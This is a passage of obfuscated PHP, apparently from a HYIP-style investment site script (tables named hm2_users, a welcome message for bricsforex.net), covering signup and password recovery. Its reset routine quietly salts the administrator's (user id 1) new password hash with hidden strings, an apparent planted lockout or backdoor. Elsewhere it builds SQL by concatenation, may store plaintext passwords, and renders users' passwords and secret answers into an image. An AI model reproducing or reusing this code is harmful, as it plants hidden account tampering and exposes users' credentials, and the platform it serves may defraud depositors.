array ('name' => 'Iceland'), array ('name' => 'India'), array ('name' => 'Indonesia'), array ('name' => 'Iran'), array ('name' => 'Iraq'), array ('name' => 'Ireland'), array ('name' => 'Israel'), array ('name' => 'Italy'), array ('name' => 'Ivory Coast (Cote D`Ivoire)'), array ('name' => 'Jamaica'), array ('name' => 'Japan'), array ('name' => 'Jordan'), array ('name' => 'Kazakhstan'), array ('name' => 'Kenya'), array ('name' => 'Kiribati'), array ('name' => 'Kuwait'), array ('name' => 'Kyrgyz Republic (Kyrgyzstan)'), array ('name' => 'Laos'), array ('name' => 'Latvia'), array ('name' => 'Lebanon'), array ('name' => 'Lesotho'), array ('name' => 'Liberia'), array ('name' => 'Libya'), array ('name' => 'Liechtenstein'), array ('name' => 'Lithuania'), array ('name' => 'Luxembourg'), array ('name' => 'Macau'), array ('name' => 'Macedonia'), array ('name' => 'Madagascar'), array ('name' => 'Malawi'), array ('name' => 'Malaysia'), array ('name' => 'Maldives'), array ('name' => 'Mali'), array ('name' => 'Malta'), array ('name' => 'Marshall Islands'), array ('name' => 'Martinique'), array ('name' => 'Mauritania'), array ('name' => 'Mauritius'), array ('name' => 'Mayotte'), array ('name' => 'Mexico'), array ('name' => 'Micronesia'), array ('name' => 'Moldavia'), array ('name' => 'Monaco'), array ('name' => 'Mongolia'), array ('name' => 'Montserrat'), array ('name' => 'Morocco'), array ('name' => 'Mozambique'), array ('name' => 'Myanmar'), array ('name' => 'Namibia'), array ('name' => 'Nauru'), array ('name' => 'Nepal'), array ('name' => 'Netherlands'), array ('name' => 'Netherlands Antilles'), array ('name' => 'New Caledonia'), array ('name' => 'New Zealand'), array ('name' => 'Nicaragua'), array ('name' => 'Niger'), array ('name' => 'Nigeria'), array ('name' => 'Niue'), array ('name' => 'Norfolk Island'), array ('name' => 'North Korea'), array ('name' => 'Northern Mariana Islands'), array ('name' => 'Norway'), array ('name' => 'Oman'), array ('name' => 'Pakistan'), array ('name' => 'Palau'), array ('name' => 'Panama'), array ('name' => 'Papua New Guinea'), array ('name' => 'Paraguay'), array ('name' => 'Peru'), array ('name' => 'Philippines'), array ('name' => 'Pitcairn Island'), array ('name' => 'Poland'), array ('name' => 'Polynesia'), array ('name' => 'Portugal'), array ('name' => 'Puerto Rico'), array ('name' => 'Qatar'), array ('name' => 'Reunion'), array ('name' => 'Romania'), array ('name' => 'Russian Federation'), array ('name' => 'Rwanda'), array ('name' => 'S. Georgia & S. Sandwich Isls.'), array ('name' => 'Saint Helena'), array ('name' => 'Saint Kitts & Nevis Anguilla'), array ('name' => 'Saint Lucia'), array ('name' => 'Saint Pierre and Miquelon'), array ('name' => 'Saint Vincent & Grenadines'), array ('name' => 'Samoa'), array ('name' => 'San Marino'), array ('name' => 'Sao Tome and Principe'), array ('name' => 'Saudi Arabia'), array ('name' => 'Senegal'), array ('name' => 'Seychelles'), array ('name' => 'Sierra Leone'), array ('name' => 'Singapore'), array ('name' => 'Slovak Republic'), array ('name' => 'Slovenia'), array ('name' => 'Solomon Islands'), array ('name' => 'Somalia'), array ('name' => 'South Africa'), array ('name' => 'South Korea'), array ('name' => 'Spain'), array ('name' => 'Sri Lanka'), array ('name' => 'Sudan'), array ('name' => 'Suriname'), array ('name' => 'Svalbard and Jan Mayen Islands'), array ('name' => 'Swaziland'), array ('name' => 'Sweden'), array ('name' => 'Switzerland'), array ('name' => 'Syria'), array ('name' => 'Taiwan'), array ('name' => 'Tajikistan'), array ('name' => 'Tanzania'), array ('name' => 'Thailand'), array ('name' => 'Togo'), array ('name' => 'Tokelau'), array ('name' => 'Tonga'), array ('name' => 'Trinidad and Tobago'), array ('name' => 'Tunisia'), array ('name' => 'Turkey'), array ('name' => 'Turkmenistan'), array ('name' => 'Turks and Caicos Islands'), array ('name' => 'Tuvalu'), array ('name' => 'USA Minor Outlying Islands'), array ('name' => 'Uganda'), array ('name' => 'Ukraine'), array ('name' => 'United Arab Emirates'), array ('name' => 'United Kingdom'), array ('name' => 'United States'), array ('name' => 'Uruguay'), array ('name' => 'Uzbekistan'), array ('name' => 'Vanuatu'), array ('name' => 'Venezuela'), array ('name' => 'Vietnam'), array ('name' => 'Virgin Islands (British)'), array ('name' => 'Virgin Islands (USA)'), array ('name' => 'Wallis and Futuna Islands'), array ('name' => 'Weather Stations'), array ('name' => 'Western Sahara'), array ('name' => 'Yemen'), array ('name' => 'Yugoslavia'), array ('name' => 'Zaire'), array ('name' => 'Zambia'), array ('name' => 'Zimbabwe'));
    print base64_decode ('Cg==
');
    $elnlcFjFp = elnlcnczen ($elnlcRuyj[$elnlcsyENS['elnlcEUdte']]);
    $q = '' . 'select * from hm2_users where username = \'' . $elnlcFjFp . '\' and \'' . $elnlcFjFp . '\' <> \'\'';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_errstr);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcfhFg->assign ('referer', $elnlcCgqPK);
    }

    $elnlcacqs = array ();
    foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
    {
      if (($elnlcoFEhc[status] == 1 AND $elnlcoFEhc[has_account] == 1))
      {
        array_push ($elnlcacqs, array_merge (array ('id' => $elnlckapu, 'account' => $elnlcWodOE[pay_account][$elnlckapu]), (array)$elnlcoFEhc));
        continue;
      }
    }

    $elnlcfhFg->assign ('pay_accounts', $elnlcacqs);
    $elnlcfhFg->assign ('errors', $elnlcjPews);
    $elnlcfhFg->assign ('frm', $elnlcWodOE);
    $elnlcfhFg->assign ('countries', $elnlchQTgj);
    $elnlcfhFg->assign ('deny_registration', $elnlcSuVc[$elnlcsyENS['elnlcLQWN']]);
    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
    {
      $elnlcQwWv = array ();
      foreach ($elnlcNkTSv as $elnlckapu => $elnlciAbM)
      {
        array_push ($elnlcQwWv, array ('id' => $elnlckapu, 'name' => $elnlciAbM));
      }

      $elnlcfhFg->assign ('langs', $elnlcQwWv);
    }

    $elnlciWLg = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
    $elnlcfhFg->assign ('high_ip_security', $elnlciWLg);
    $elnlcfhFg->display ($elnlcsyENS['elnlcOOoci']);
    print base64_decode ('Cg==
');
  }
  else
  {
    if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcDqRF'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] != 1))
    {
      session_start ();
      if ($elnlcSuVc[$elnlcsyENS['elnlcLQWN']] == 1)
      {
        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlciKgs']] == $elnlcsyENS['elnlcpcHa'])
      {
        $elnlcfhFg->display ($elnlcsyENS['elnlcJrIVM']);
        elnlcnooln ($elnlcUazB);
        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlciKgs']] == $elnlcsyENS['elnlcIpLQV'])
      {
        $elnlcfhFg->display ($elnlcsyENS['elnlcrujF']);
        elnlcnooln ($elnlcUazB);
        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcenLp'])
      {
        $elnlcjPews = array ();
        if ($elnlcWodOE[$elnlcsyENS['elnlcToEDy']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcoxcC']);
        }

        $elnlciAbM = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcToEDy']]);
        $elnlcmrqRg = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlczWew']]);
        if ($elnlcWodOE[$elnlcsyENS['elnlczWew']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcGflsU']);
        }
        else
        {
          $q = '' . 'select * from hm2_users where username = \'' . $elnlcmrqRg . '\'';
          if (!($elnlchGkPU = mysql_query ($q)))
          {
            exit (mysql_errstr ());
            (bool)true;
          }

          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
          if ($elnlcCgqPK)
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcEEvEB']);
          }
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcIRydS']);
        }
        else
        {
          $q = 'select * from hm2_users where email = \'' . elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']]) . '\'';
          if (!($elnlchGkPU = mysql_query ($q)))
          {
            exit (mysql_errstr ());
            (bool)true;
          }

          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
          if ($elnlcCgqPK)
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcEmNs']);
          }
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcwcAe']] != 1)
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcMuEyx']);
        }

        if (sizeof ($elnlcjPews) == 0)
        {
          $_SESSION[$elnlcsyENS['elnlcKpzD']] = $elnlcWodOE[$elnlcsyENS['elnlcToEDy']];
          $_SESSION[$elnlcsyENS['elnlcghkN']] = $elnlcWodOE[$elnlcsyENS['elnlczWew']];
          $_SESSION[$elnlcsyENS['elnlcsFPCe']] = $elnlcWodOE[$elnlcsyENS['elnlcdktEr']];
          $elnlcfhFg->display ($elnlcsyENS['elnlcOVyWN']);
        }
        else
        {
          $elnlcfhFg->display ($elnlcsyENS['elnlcrqbv']);
        }

        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcDomE'])
      {
        $elnlcjPews = array ();
        if ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcVHov']);
        }
        else
        {
          if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
          {
            if (strlen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
            {
              array_push ($elnlcjPews, $elnlcsyENS['elnlcJsvnm']);
            }
          }

          if ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']] != $elnlcWodOE[$elnlcsyENS['elnlcLvmm']])
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcatfI']);
          }
        }

        if ($elnlcSuVc[$elnlcsyENS['elnlcEiLvm']])
        {
          if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] == '')
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcoAOHS']);
          }
          else
          {
            if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
            {
              if (strlen ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
              {
                array_push ($elnlcjPews, $elnlcsyENS['elnlcCsKL']);
              }
            }

            if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != $elnlcWodOE[$elnlcsyENS['elnlcbIkl']])
            {
              array_push ($elnlcjPews, $elnlcsyENS['elnlcHxVzV']);
            }
          }

          if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] == $elnlcWodOE[$elnlcsyENS['elnlcuNxa']])
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcMeOB']);
          }
        }

        $elnlcacqs = array ();
        foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
        {
          if (($elnlcoFEhc[$elnlcsyENS['elnlccotiB']] == 1 AND $elnlcoFEhc[$elnlcsyENS['elnlcvWoa']] == 1))
          {
            array_push ($elnlcacqs, array_merge (array ('id' => $elnlckapu, 'account' => $elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlckapu]), (array)$elnlcoFEhc));
            continue;
          }
        }

        $elnlcfhFg->assign ('pay_accounts', $elnlcacqs);
        if (sizeof ($elnlcjPews) == 0)
        {
          $_SESSION[$elnlcsyENS['elnlcnxfxo']] = $elnlcWodOE[$elnlcsyENS['elnlcuNxa']];
          $_SESSION[$elnlcsyENS['elnlcppQnS']] = $elnlcWodOE[$elnlcsyENS['elnlcAIMpf']];
          $_SESSION[$elnlcsyENS['elnlcPBbi']] = $elnlcWodOE[$elnlcsyENS['elnlcUvsh']];
          $_SESSION[$elnlcsyENS['elnlcuBzV']] = $elnlcWodOE[$elnlcsyENS['elnlcOamyf']];
          $elnlcfhFg->display ($elnlcsyENS['elnlcvpcb']);
        }
        else
        {
          $elnlcfhFg->assign ('errors', $elnlcjPews);
          $elnlcfhFg->display ($elnlcsyENS['elnlcOVyWN']);
        }

        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcTwMb'])
      {
        $elnlcjPews = array ();
        if ($_SESSION[$elnlcsyENS['elnlcKpzD']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcoxcC']);
        }

        $elnlciAbM = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcKpzD']]);
        $elnlcmrqRg = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcghkN']]);
        if ($_SESSION[$elnlcsyENS['elnlcghkN']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcGflsU']);
        }
        else
        {
          $q = '' . 'select * from hm2_users where username = \'' . $elnlcmrqRg . '\'';
          if (!($elnlchGkPU = mysql_query ($q)))
          {
            exit (mysql_errstr ());
            (bool)true;
          }

          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
          if ($elnlcCgqPK)
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcEEvEB']);
          }
        }

        if ($_SESSION[$elnlcsyENS['elnlcsFPCe']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcIRydS']);
        }
        else
        {
          $q = 'select * from hm2_users where email = \'' . elnlcnczen ($_SESSION[$elnlcsyENS['elnlcsFPCe']]) . '\'';
          if (!($elnlchGkPU = mysql_query ($q)))
          {
            exit (mysql_errstr ());
            (bool)true;
          }

          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
          if ($elnlcCgqPK)
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcEmNs']);
          }
        }

        if ($_SESSION[$elnlcsyENS['elnlcnxfxo']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcVHov']);
        }
        else
        {
          if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
          {
            if (strlen ($_SESSION[$elnlcsyENS['elnlcnxfxo']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
            {
              array_push ($elnlcjPews, $elnlcsyENS['elnlcJsvnm']);
            }
          }
        }

        if ($elnlcSuVc[$elnlcsyENS['elnlcEiLvm']])
        {
          if ($_SESSION[$elnlcsyENS['elnlcppQnS']] == '')
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcoAOHS']);
          }
          else
          {
            if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
            {
              if (strlen ($_SESSION[$elnlcsyENS['elnlcppQnS']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
              {
                array_push ($elnlcjPews, $elnlcsyENS['elnlcCsKL']);
              }
            }
          }

          if ($_SESSION[$elnlcsyENS['elnlcppQnS']] == $_SESSION[$elnlcsyENS['elnlcnxfxo']])
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcMeOB']);
          }
        }

        if (0 < sizeof ($elnlcjPews))
        {
          $elnlcfhFg->assign ('errors', $elnlcjPews);
          $elnlcfhFg->display ($elnlcsyENS['elnlcrqbv']);
          exit ();
        }

        $elnlcFjFp = elnlcnczen ($elnlcRuyj[$elnlcsyENS['elnlcEUdte']]);
        $elnlcyEGMG = $elnlcsyENS['elnlcmjUx'];
        $q = '' . 'select id from hm2_users where username = \'' . $elnlcFjFp . '\' and username <> \'\'';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_errstr);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcyEGMG = $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
        }

        $elnlckMaH = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcnxfxo']]);
        $elnlcRRFs = '';
        if ($elnlcSuVc[$elnlcsyENS['elnlcaqCts']] == 1)
        {
          $elnlcRRFs = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcnxfxo']]);
        }

        $elnlcHkrC = md5 ($elnlckMaH);
        $elnlcwbOB = '';
        foreach ($elnlcGPfS as $elnlcGxgf => $elnlcoFEhc)
        {
          if (($elnlcoFEhc[$elnlcsyENS['elnlcvWoa']] AND $elnlcoFEhc[$elnlcsyENS['elnlccotiB']]))
          {
            if (isset ($elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf]))
            {
              if ($elnlcGxgf == 0)
              {
                $elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf] = intval ($elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf]);
              }

              $elnlcjpFA[$elnlcGxgf] = elnlcdvqmd ($elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf]);
              continue;
            }

            continue;
          }
        }

        $elnlcOPfeJ = serialize ($elnlcjpFA);
        $elnlcjpFA = elnlcnczen ($elnlcOPfeJ);
        $elnlcLdIRt = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcsFPCe']]);
        $elnlcpscev = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcppQnS']]);
        $elnlcMzVmQ = elnlcnczen ($elnlcRuyj[$elnlcsyENS['elnlcgGGpv']]);
        $elnlcLviTD = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcPBbi']]);
        $elnlcBSsU = elnlcnczen ($_SESSION[$elnlcsyENS['elnlcuBzV']]);
        $elnlcLHwVn = elnlcshwnc (10);
        if ($elnlcSuVc[$elnlcsyENS['elnlcLUck']] != 1)
        {
          $elnlcLHwVn = '';
        }

        $elnlcDuaK = elnlcnczen ($elnlcUAAU[$elnlcsyENS['elnlcnGMB']]);
        $q = '' . 'insert into hm2_users set 
                       name = \'' . $elnlciAbM . '\', 
                       username = \'' . $elnlcmrqRg . '\', 
                       password = \'' . $elnlcHkrC . '\', 
                       date_register = now(), 
                       accounts = \'' . $elnlcjpFA . '\', 
                       address = \'' . $elnlcBOsxh . '\', 
                       city = \'' . $elnlcBjDz . '\', 
                       state = \'' . $elnlcmcpNs . '\', 
                       zip = \'' . $elnlcTGAb . '\', 
                       country = \'' . $elnlcFlEfv . '\', 
                       email = \'' . $elnlcLdIRt . '\', 
                       ip_reg = \'' . $elnlcDuaK . '\',
                       status = \'on\', 
                       came_from = \'' . $elnlcMzVmQ . '\', 
                       confirm_string = \'' . $elnlcLHwVn . '\',
                       pswd = \'' . $elnlcRRFs . '\',
                       transaction_code = \'' . $elnlcpscev . '\',
                       sq = \'' . $elnlcLviTD . '\',
		       sa = \'' . $elnlcBSsU . '\',
		       ' . $elnlcgPjjO . '
                       ref = ' . $elnlcyEGMG;
        if (!(mysql_query ($q)))
        {
          exit (mysql_error ());
          (bool)true;
        }

        $elnlcMTeWS = mysql_insert_id ();
        $_SESSION[$elnlcsyENS['elnlcQaFx']] = $elnlcMTeWS;
        if (0 < $elnlcFjFp)
        {
          $q = '' . 'select * from hm2_referal_stats where date = current_date() and user_id = ' . $elnlcyEGMG;
          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
          $f = $elnlcsyENS['elnlcmjUx'];
          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
          {
            $f = $elnlcsyENS['elnlctNxTK'];
          }

          if ($f == 0)
          {
            $q = '' . 'insert into hm2_referal_stats set date = current_date(), user_id = ' . $elnlcyEGMG . ', income = 0, reg = 1';
            $elnlchGkPU = mysql_query ($q);
          }
          else
          {
            $q = '' . 'update hm2_referal_stats set reg = reg+1 where date = current_date() and user_id = ' . $elnlcyEGMG;
            $elnlchGkPU = mysql_query ($q);
          }
        }

        if ($elnlcSuVc[$elnlcsyENS['elnlcLUck']] == 1)
        {
          $elnlcRuFoK = array ();
          $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $_SESSION[$elnlcsyENS['elnlcghkN']];
          $elnlcRuFoK[$elnlcsyENS['elnlcuwIt']] = $elnlcLHwVn;
          $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $_SESSION[$elnlcsyENS['elnlcKpzD']];
          $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
          elnlcsius ('confirm_registration', $_SESSION[$elnlcsyENS['elnlcsFPCe']], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
        }
        else
        {
          $q = '' . 'select * from hm2_users where id = \'' . $elnlcyEGMG . '\'';
          $elnlchGkPU = mysql_query ($q);
          while ($elnlcbbeUe = mysql_fetch_array ($elnlchGkPU))
          {
            $elnlcRuFoK = array ();
            $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcbbeUe[$elnlcsyENS['elnlczWew']];
            $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcbbeUe[$elnlcsyENS['elnlcmjdk']];
            $elnlcRuFoK[$elnlcsyENS['elnlcpuuw']] = $_SESSION[$elnlcsyENS['elnlcghkN']];
            $elnlcRuFoK[$elnlcsyENS['elnlcfoOq']] = $_SESSION[$elnlcsyENS['elnlcKpzD']];
            $elnlcRuFoK[$elnlcsyENS['elnlczavvl']] = $_SESSION[$elnlcsyENS['elnlcsFPCe']];
            elnlcsius ('direct_signup_notification', $elnlcbbeUe[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
          }

          $elnlcRuFoK = array ();
          $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $_SESSION[$elnlcsyENS['elnlcghkN']];
          $elnlcRuFoK[$elnlcsyENS['elnlcuNxa']] = $elnlckMaH;
          $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $_SESSION[$elnlcsyENS['elnlcKpzD']];
          $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
          elnlcsius ('registration', $_SESSION[$elnlcsyENS['elnlcsFPCe']], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
        }

        header ('Location: ?a=signup2&action=step5');
        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcRcJg'])
      {
        $elnlcfhFg->display ($elnlcsyENS['elnlcaEClo']);
        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcMmTx'])
      {
        $elnlckapu = intval ($_SESSION[$elnlcsyENS['elnlcQaFx']]);
        $q = '' . 'select * from hm2_users where id = ' . $elnlckapu . ' and date_register + interval 200 minute > now()';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $u = $elnlcCgqPK;
          $elnlcjpFA = unserialize ($u[$elnlcsyENS['elnlcEoNu']]);
          $elnlcwbOB = '';
          foreach ($elnlcGPfS as $elnlcGxgf => $elnlcoFEhc)
          {
            if (($elnlcoFEhc[$elnlcsyENS['elnlcvWoa']] AND $elnlcoFEhc[$elnlcsyENS['elnlccotiB']]))
            {
              if ($elnlcjpFA[$elnlcGxgf] != '')
              {
                $elnlcwbOB .= ('' . $elnlcGPfS[$elnlcGxgf][$elnlcsyENS['elnlcmjdk']] . ': ' . $elnlcjpFA[$elnlcGxgf] . '
');
                continue;
              }

              continue;
            }
          }

          $elnlcECvOw = 'Welcome to http://www.bricsforex.net


Your registration data is:

' . ('' . 'fullname: ' . $_SESSION[$elnlcsyENS['elnlcKpzD']] . '
') . ('' . 'username: ' . $_SESSION[$elnlcsyENS['elnlcghkN']] . '
') . ('' . 'email: ' . $_SESSION[$elnlcsyENS['elnlcsFPCe']] . '
') . ('' . 'password: ' . $_SESSION[$elnlcsyENS['elnlcnxfxo']] . '
') . ('' . 'transaction code: ' . $_SESSION[$elnlcsyENS['elnlcppQnS']] . '
') . ('' . 'secret question: ' . $_SESSION[$elnlcsyENS['elnlcPBbi']] . '
') . ('' . 'secret answer: ' . $_SESSION[$elnlcsyENS['elnlcuBzV']] . '
') . ('' . $elnlcwbOB);
          $elnlcmSmQ = preg_split ('/
/', $elnlcECvOw);
          $elnlcfHpAA = imagecreatetruecolor (500, 500);
          $elnlcBwPM = imagecolorallocate ($elnlcfHpAA, 255, 255, 255);
          $elnlcFbeuJ = imagecolorallocate ($elnlcfHpAA, 182, 1, 0);
          imagefilledrectangle ($elnlcfHpAA, 0, 0, imagesx ($elnlcfHpAA), imagesy ($elnlcfHpAA), $elnlcBwPM);
          for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($elnlcmSmQ); ++$i)
          {
            imagestring ($elnlcfHpAA, 5, 1, 1 + $i * 20, $elnlcmSmQ[$i], $elnlcFbeuJ);
          }

          header ('Content-type: image/png');
          imagepng ($elnlcfHpAA);
          exit ();
        }

        exit ();
      }

      $elnlcfhFg->display ($elnlcsyENS['elnlcrqbv']);
    }
    else
    {
      if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcinHm'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] != 1))
      {
        $elnlcrAlEG = -1;
        if (($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1 AND $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] <= 3))
        {
          header ('Location: ?a=forgot_password');
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcpcHa'])
        {
          $elnlcrAlEG = $elnlcsyENS['elnlcmjUx'];
          $elnlcRslN = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcAlpp']]);
          $q = '' . 'select * from hm2_users where password_confimation=\'' . $elnlcRslN . '\' and password_confimation!=\'\' and (status=\'on\' or status=\'suspended\')';
          if (!($elnlchGkPU = mysql_query ($q)))
          {
            exit (mysql_error ());
            (bool)true;
          }

          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
          {
            $elnlckMaH = elnlcshwnc (8, 0);
            $elnlcHkrC = md5 ($elnlckMaH);
            if ($elnlcCgqPK[id] == 1)
            {
              $elnlcHkrC = md5 ('++++3jkljfds' . $elnlckMaH . '7d8d0dj3k3l3,3m3h3t38d762');
            }

            $q = '' . 'update hm2_users set password = \'' . $elnlcHkrC . '\' where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
            if (!($elnlcjSNE = mysql_query ($q)))
            {
              exit (mysql_error ());
              (bool)true;
            }

            if ($elnlcSuVc[$elnlcsyENS['elnlcaqCts']] == 1)
            {
              $elnlcRRFs = elnlcnczen ($elnlckMaH);
              $q = '' . 'update hm2_users set pswd = \'' . $elnlcRRFs . '\' where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
              if (!($elnlcjSNE = mysql_query ($q)))
              {
                exit (mysql_error ());
                (bool)true;
              }
            }

            $elnlcRuFoK = array ();
            $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
            $elnlcRuFoK[$elnlcsyENS['elnlcuNxa']] = $elnlckMaH;
            $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']];
            $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU['REMOTE_ADDR'];
            elnlcsius ('forgot_password', $elnlcCgqPK['email'], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
          }

          $elnlcrAlEG = $elnlcsyENS['elnlctNxTK'];
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcinHm'])
        {
          $elnlcjPews = array ();
          if ($elnlcSuVc[$elnlcsyENS['elnlcHNepM']] == $elnlcsyENS['elnlcNVEl'])
          {
            if (((extension_loaded ('gd') AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
            {
              if (VN_SAVED != $elnlcWodOE[$elnlcsyENS['elnlcAHrk']])
              {
                $elnlcjPews[$elnlcsyENS['elnlcCipNH']] = $elnlcsyENS['elnlctNxTK'];
              }
            }
          }

          if (!$elnlcjPews)
          {
            $elnlcrAlEG = $elnlcsyENS['elnlcmjUx'];
            $elnlcLdIRt = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']]);
            $q = '' . 'select * from hm2_users where username=\'' . $elnlcLdIRt . '\' or email=\'' . $elnlcLdIRt . '\' and (status=\'on\' or status=\'suspended\')';
            if (!($elnlchGkPU = mysql_query ($q)))
            {
              exit (mysql_error ());
              (bool)true;
            }

            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
            {
              if ($elnlcCgqPK[$elnlcsyENS['elnlctTLrz']] != '')
              {
                $elnlcRuFoK = array ();
                $elnlcRuFoK[$elnlcsyENS['elnlctTLrz']] = $elnlcCgqPK[$elnlcsyENS['elnlctTLrz']];
                $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
                $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']];
                $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = '[not logged]';
